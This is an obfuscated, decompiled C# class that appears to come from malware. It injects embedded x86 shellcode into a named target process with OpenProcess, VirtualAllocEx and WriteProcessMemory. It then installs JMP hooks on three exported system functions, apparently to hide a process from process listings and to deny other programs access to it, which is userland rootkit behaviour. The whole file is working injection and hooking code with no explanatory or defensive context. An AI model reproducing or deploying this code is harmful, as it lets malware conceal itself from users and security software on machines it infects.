using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace LKDFotCmhcU;

internal sealed class tEHWewuHPsL
{
	public struct oXivXoVVSnKIsC
	{
		public uint wizmDBpEaJx;

		public uint quzqJUdXICep;

		public uint BPTRgWrXzlDLt;

		public uint ndarVYzqKKo;

		public uint OKclPrJllPcVnk;

		public IntPtr ffYAaHVHMVrEeX;

		public uint shbHUbVlxLPERG;

		public IntPtr vPWMdQmNHkTQ;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
		public string oiFIwTuoxMi;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
		public string RFvpyWfYXdpSD;
	}

	private static byte[] EuaFAaqnIrkC;

	private static byte[] fMgnBTbepEXC;

	private static byte[] rZuvFZpcQXx;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool CloseHandle(IntPtr intptr_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr vtALOwxDVjc, IntPtr HOojgsSSfG, [Out] byte[] KCLyGgtHOHtV, uint warIRnCXCwlCLSS, ref uint CImfZnkglugsx);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, uint uint_0, ref uint uint_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualProtectEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, uint uint_1, ref uint uint_2);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool Module32Next(IntPtr intptr_0, ref oXivXoVVSnKIsC oXivXoVVSnKIsC_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool Module32First(IntPtr intptr_0, ref oXivXoVVSnKIsC oXivXoVVSnKIsC_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr CreateToolhelp32Snapshot(uint uint_0, uint uint_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, uint uint_1, uint uint_2);

	private static byte[] lgXSrqtlloo(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		checked
		{
			byte[] array = new byte[(int)(unchecked((ulong)uint_0) - 1uL) + 1];
			byte[] kCLyGgtHOHtV = array;
			uint CImfZnkglugsx = 0u;
			ReadProcessMemory(intptr_0, intptr_1, kCLyGgtHOHtV, uint_0, ref CImfZnkglugsx);
			return array;
		}
	}

	private static uint pWnBJwdnvJHw(IntPtr intptr_0, uint uint_0, string string_0)
	{
		checked
		{
			uint num = BitConverter.ToUInt32(lgXSrqtlloo(intptr_0, (IntPtr)(long)(unchecked((ulong)uint_0) + 60uL), 4u), 0);
			uint num2 = BitConverter.ToUInt32(lgXSrqtlloo(intptr_0, (IntPtr)(long)(unchecked((ulong)checked(uint_0 + num)) + 120uL), 4u), 0);
			byte[] value = lgXSrqtlloo(intptr_0, (IntPtr)(uint_0 + num2), 40u);
			int num3 = BitConverter.ToInt32(value, 24);
			uint num4 = BitConverter.ToUInt32(value, 32) + uint_0;
			uint num5 = BitConverter.ToUInt32(value, 28) + uint_0;
			uint num6 = BitConverter.ToUInt32(value, 36) + uint_0;
			IntPtr intPtr = Marshal.AllocHGlobal(64);
			int num7 = num3;
			int num8 = 1;
			while (true)
			{
				int num9 = num8;
				int num10 = num7;
				if (num9 > num10)
				{
					break;
				}
				uint num11 = BitConverter.ToUInt32(lgXSrqtlloo(intptr_0, (IntPtr)(long)(num4 + (ulong)((num8 - 1) * 4)), 4u), 0);
				Marshal.Copy(lgXSrqtlloo(intptr_0, (IntPtr)(uint_0 + num11), 64u), 0, intPtr, 64);
				string strA = Marshal.PtrToStringAnsi(intPtr);
				uint num12 = (uint)BitConverter.ToInt16(lgXSrqtlloo(intptr_0, (IntPtr)(long)(num6 + (ulong)((num8 - 1) * 2)), 2u), 0);
				uint result = BitConverter.ToUInt32(lgXSrqtlloo(intptr_0, (IntPtr)(long)(num5 + unchecked((ulong)num12) * 4uL), 4u), 0) + uint_0;
				if (string.Compare(strA, string_0, ignoreCase: true) != 0)
				{
					num8++;
					continue;
				}
				Marshal.FreeHGlobal(intPtr);
				return result;
			}
			Marshal.FreeHGlobal(intPtr);
			uint num13 = 0u;
			return 0u;
		}
	}

	private static IntPtr zKWNTaQmKbP(string string_0, string string_1)
	{
		checked
		{
			IntPtr intPtr = CreateToolhelp32Snapshot(24u, (uint)Process.GetProcessesByName(string_0)[0].Id);
			IntPtr zero = IntPtr.Zero;
			if (intPtr == zero)
			{
				return zero;
			}
			oXivXoVVSnKIsC oXivXoVVSnKIsC_ = default(oXivXoVVSnKIsC);
			oXivXoVVSnKIsC_.wizmDBpEaJx = (uint)Marshal.SizeOf(oXivXoVVSnKIsC_);
			if (Module32First(intPtr, ref oXivXoVVSnKIsC_))
			{
				do
				{
					if (oXivXoVVSnKIsC_.ffYAaHVHMVrEeX.ToInt64() <= 2147483647L && string.Compare(string_1, oXivXoVVSnKIsC_.oiFIwTuoxMi, ignoreCase: true) == 0)
					{
						return oXivXoVVSnKIsC_.ffYAaHVHMVrEeX;
					}
				}
				while (Module32Next(intPtr, ref oXivXoVVSnKIsC_));
			}
			return zero;
		}
	}

	private static int iGgfEaPlYAUJ(int int_0, int int_1)
	{
		return checked(int_0 - int_1 - 5);
	}

	public static void xmOmWWdnfrenPY(string string_0)
	{
		byte[] array = new byte[97];
		uint[] array2 = new uint[4];
		byte[][] array3 = new byte[4][];
		uint uint_ = 0u;
		byte[] array4 = new byte[5] { 233, 0, 0, 0, 0 };
		byte[][] array5 = new byte[3][] { EuaFAaqnIrkC, fMgnBTbepEXC, rZuvFZpcQXx };
		checked
		{
			uint num = (uint)(array5[0].Length + array5[1].Length + array5[2].Length);
			IntPtr intPtr = OpenProcess(56, bool_0: false, (uint)Process.GetProcessesByName(string_0)[0].Id);
			IntPtr zero = IntPtr.Zero;
			uint num2 = (uint)(int)VirtualAllocEx(intPtr, zero, (uint)(unchecked((ulong)num) + 96uL), 12288u, 64u);
			uint value = (uint)(int)pWnBJwdnvJHw(intPtr, (uint)(int)zKWNTaQmKbP(string_0, getString_0(107400715)), getString_0(107400666));
			uint value2 = (uint)(int)pWnBJwdnvJHw(intPtr, (uint)(int)zKWNTaQmKbP(string_0, getString_0(107400715)), getString_0(107400681));
			array2[0] = (uint)(int)pWnBJwdnvJHw(intPtr, (uint)(int)zKWNTaQmKbP(string_0, getString_0(107400652)), getString_0(107400639));
			array2[1] = (uint)(int)pWnBJwdnvJHw(intPtr, (uint)(int)zKWNTaQmKbP(string_0, getString_0(107400652)), getString_0(107400098));
			array2[2] = (uint)(int)pWnBJwdnvJHw(intPtr, (uint)(int)zKWNTaQmKbP(string_0, getString_0(107400652)), getString_0(107400045));
			array3[0] = lgXSrqtlloo(intPtr, (IntPtr)array2[0], 24u);
			array3[1] = lgXSrqtlloo(intPtr, (IntPtr)array2[1], 24u);
			array3[2] = lgXSrqtlloo(intPtr, (IntPtr)array2[2], 24u);
			BitConverter.GetBytes(value).CopyTo(array, 0);
			BitConverter.GetBytes(value2).CopyTo(array, 4);
			BitConverter.GetBytes(Process.GetCurrentProcess().Id).CopyTo(array, 8);
			BitConverter.GetBytes(array2[0]).CopyTo(array, 12);
			BitConverter.GetBytes(array2[1]).CopyTo(array, 16);
			BitConverter.GetBytes(array2[2]).CopyTo(array, 20);
			array3[0].CopyTo(array, 24);
			array3[1].CopyTo(array, 48);
			array3[2].CopyTo(array, 72);
			uint num3 = num2;
			IntPtr intptr_ = intPtr;
			IntPtr intptr_2 = (IntPtr)num3;
			byte[] byte_ = array;
			uint uint_2 = 0u;
			WriteProcessMemory(intptr_, intptr_2, byte_, 96u, ref uint_2);
			num3 = (uint)(unchecked((ulong)num3) + 96uL);
			int num4 = array5.Length - 1;
			int num5 = 0;
			while (true)
			{
				int num6 = num5;
				int num7 = num4;
				if (num6 > num7)
				{
					break;
				}
				IntPtr intptr_3 = intPtr;
				IntPtr intptr_4 = (IntPtr)num3;
				byte[] byte_2 = array5[num5];
				uint uint_3 = (uint)array5[num5].Length;
				uint_2 = 0u;
				WriteProcessMemory(intptr_3, intptr_4, byte_2, uint_3, ref uint_2);
				num3 = (uint)(num3 + (ulong)array5[num5].Length);
				num5++;
			}
			IntPtr intptr_5 = intPtr;
			IntPtr intptr_6 = (IntPtr)num2;
			uint uint_4 = (uint)(unchecked((ulong)num) + 96uL);
			uint_2 = 0u;
			VirtualProtectEx(intptr_5, intptr_6, uint_4, 16u, ref uint_2);
			num3 = (uint)(unchecked((ulong)num2) + 96uL);
			BitConverter.GetBytes(iGgfEaPlYAUJ((int)num3, (int)array2[0])).CopyTo(array4, 1);
			VirtualProtectEx(intPtr, (IntPtr)array2[0], (uint)array4.Length, 64u, ref uint_);
			IntPtr intptr_7 = intPtr;
			IntPtr intptr_8 = (IntPtr)array2[0];
			byte[] byte_3 = array4;
			uint uint_5 = (uint)array4.Length;
			uint_2 = 0u;
			WriteProcessMemory(intptr_7, intptr_8, byte_3, uint_5, ref uint_2);
			IntPtr intptr_9 = intPtr;
			IntPtr intptr_10 = (IntPtr)array2[0];
			uint uint_6 = (uint)array4.Length;
			uint uint_7 = uint_;
			uint_2 = 0u;
			VirtualProtectEx(intptr_9, intptr_10, uint_6, uint_7, ref uint_2);
			num3 = (uint)(num3 + (ulong)array5[0].Length);
			BitConverter.GetBytes(iGgfEaPlYAUJ((int)num3, (int)array2[1])).CopyTo(array4, 1);
			VirtualProtectEx(intPtr, (IntPtr)array2[1], (uint)array4.Length, 64u, ref uint_);
			IntPtr intptr_11 = intPtr;
			IntPtr intptr_12 = (IntPtr)array2[1];
			byte[] byte_4 = array4;
			uint uint_8 = (uint)array4.Length;
			uint_2 = 0u;
			WriteProcessMemory(intptr_11, intptr_12, byte_4, uint_8, ref uint_2);
			IntPtr intptr_13 = intPtr;
			IntPtr intptr_14 = (IntPtr)array2[1];
			uint uint_9 = (uint)array4.Length;
			uint uint_10 = uint_;
			uint_2 = 0u;
			VirtualProtectEx(intptr_13, intptr_14, uint_9, uint_10, ref uint_2);
			num3 = (uint)(num3 + (ulong)array5[1].Length);
			BitConverter.GetBytes(iGgfEaPlYAUJ((int)num3, (int)array2[2])).CopyTo(array4, 1);
			VirtualProtectEx(intPtr, (IntPtr)array2[2], (uint)array4.Length, 64u, ref uint_);
			IntPtr intptr_15 = intPtr;
			IntPtr intptr_16 = (IntPtr)array2[2];
			byte[] byte_5 = array4;
			uint uint_11 = (uint)array4.Length;
			uint_2 = 0u;
			WriteProcessMemory(intptr_15, intptr_16, byte_5, uint_11, ref uint_2);
			IntPtr intptr_17 = intPtr;
			IntPtr intptr_18 = (IntPtr)array2[2];
			uint uint_12 = (uint)array4.Length;
			uint uint_13 = uint_;
			uint_2 = 0u;
			VirtualProtectEx(intptr_17, intptr_18, uint_12, uint_13, ref uint_2);
			CloseHandle(intPtr);
		}
	}

	static tEHWewuHPsL()
	{
		Strings.CreateGetStringDelegate(typeof(tEHWewuHPsL));
		EuaFAaqnIrkC = new byte[240]
		{
			85, 139, 236, 131, 236, 20, 86, 199, 69, 248,
			1, 0, 0, 192, 232, 0, 0, 0, 0, 88,
			37, 0, 240, 255, 255, 137, 69, 252, 255, 117,
			24, 255, 117, 20, 255, 117, 16, 255, 117, 12,
			255, 117, 8, 139, 69, 252, 131, 192, 24, 255,
			208, 137, 69, 248, 131, 125, 248, 0, 15, 140,
			168, 0, 0, 0, 255, 117, 8, 139, 69, 252,
			255, 16, 139, 240, 139, 69, 252, 255, 80, 4,
			59, 240, 116, 10, 131, 125, 8, 255, 15, 133,
			138, 0, 0, 0, 131, 101, 244, 0, 235, 7,
			139, 69, 244, 64, 137, 69, 244, 131, 125, 244,
			3, 115, 119, 139, 69, 244, 139, 77, 252, 131,
			124, 129, 12, 0, 116, 101, 139, 69, 244, 139,
			77, 252, 139, 68, 129, 12, 59, 69, 12, 114,
			86, 139, 69, 12, 3, 69, 20, 139, 77, 244,
			139, 85, 252, 57, 68, 138, 12, 115, 68, 139,
			69, 244, 139, 77, 252, 139, 68, 129, 12, 43,
			69, 12, 137, 69, 240, 131, 101, 236, 0, 235,
			7, 139, 69, 236, 64, 137, 69, 236, 131, 125,
			236, 24, 115, 33, 139, 69, 244, 107, 192, 24,
			139, 77, 252, 141, 68, 1, 24, 139, 77, 236,
			3, 77, 240, 139, 85, 16, 139, 117, 236, 138,
			4, 48, 136, 4, 10, 235, 210, 233, 124, 255,
			255, 255, 139, 69, 248, 94, 201, 194, 20, 0
		};
		fMgnBTbepEXC = new byte[84]
		{
			85, 139, 236, 81, 81, 199, 69, 248, 1, 0,
			0, 192, 232, 0, 0, 0, 0, 88, 37, 0,
			240, 255, 255, 137, 69, 252, 131, 125, 20, 0,
			116, 22, 139, 69, 20, 139, 77, 252, 139, 0,
			59, 65, 8, 117, 9, 199, 69, 248, 34, 0,
			0, 192, 235, 23, 255, 117, 20, 255, 117, 16,
			255, 117, 12, 255, 117, 8, 139, 69, 252, 131,
			192, 48, 255, 208, 137, 69, 248, 139, 69, 248,
			201, 194, 16, 0
		};
		rZuvFZpcQXx = new byte[405]
		{
			85, 139, 236, 131, 236, 28, 86, 87, 199, 69,
			236, 1, 0, 0, 192, 232, 0, 0, 0, 0,
			88, 37, 0, 240, 255, 255, 137, 69, 240, 255,
			117, 20, 255, 117, 16, 255, 117, 12, 255, 117,
			8, 139, 69, 240, 131, 192, 72, 255, 208, 137,
			69, 236, 131, 125, 236, 0, 15, 140, 78, 1,
			0, 0, 131, 125, 8, 5, 117, 93, 131, 101,
			248, 0, 139, 69, 12, 137, 69, 244, 139, 69,
			244, 131, 56, 0, 116, 70, 139, 69, 244, 137,
			69, 248, 139, 69, 248, 139, 77, 248, 3, 8,
			137, 77, 244, 139, 69, 244, 139, 77, 240, 139,
			64, 68, 59, 65, 8, 117, 37, 139, 69, 244,
			131, 56, 0, 117, 8, 139, 69, 248, 131, 32,
			0, 235, 15, 139, 69, 248, 139, 0, 139, 77,
			244, 3, 1, 139, 77, 248, 137, 1, 139, 69,
			248, 137, 69, 244, 235, 178, 233, 235, 0, 0,
			0, 131, 125, 8, 16, 15, 133, 225, 0, 0,
			0, 139, 69, 12, 137, 69, 252, 131, 101, 232,
			0, 235, 7, 139, 69, 232, 64, 137, 69, 232,
			139, 69, 252, 139, 77, 232, 59, 8, 15, 131,
			192, 0, 0, 0, 139, 69, 232, 193, 224, 4,
			139, 77, 252, 139, 85, 240, 139, 68, 1, 4,
			59, 66, 8, 15, 133, 162, 0, 0, 0, 139,
			69, 232, 193, 224, 4, 139, 77, 252, 198, 68,
			1, 9, 0, 139, 69, 232, 193, 224, 4, 139,
			77, 252, 131, 100, 1, 16, 0, 139, 69, 232,
			193, 224, 4, 51, 201, 139, 85, 252, 102, 137,
			76, 2, 10, 139, 69, 232, 193, 224, 4, 139,
			77, 252, 131, 100, 1, 12, 0, 139, 69, 232,
			193, 224, 4, 139, 77, 252, 198, 68, 1, 8,
			0, 139, 69, 232, 193, 224, 4, 139, 77, 252,
			131, 100, 1, 4, 0, 139, 69, 232, 137, 69,
			228, 235, 7, 139, 69, 228, 64, 137, 69, 228,
			139, 69, 252, 139, 77, 228, 59, 8, 115, 33,
			139, 69, 228, 64, 193, 224, 4, 139, 77, 252,
			141, 116, 1, 4, 139, 69, 228, 193, 224, 4,
			139, 77, 252, 141, 124, 1, 4, 165, 165, 165,
			165, 235, 206, 139, 69, 252, 139, 0, 72, 139,
			77, 252, 137, 1, 139, 69, 232, 72, 137, 69,
			232, 233, 43, 255, 255, 255, 139, 69, 236, 95,
			94, 201, 194, 16, 0
		};
	}
}
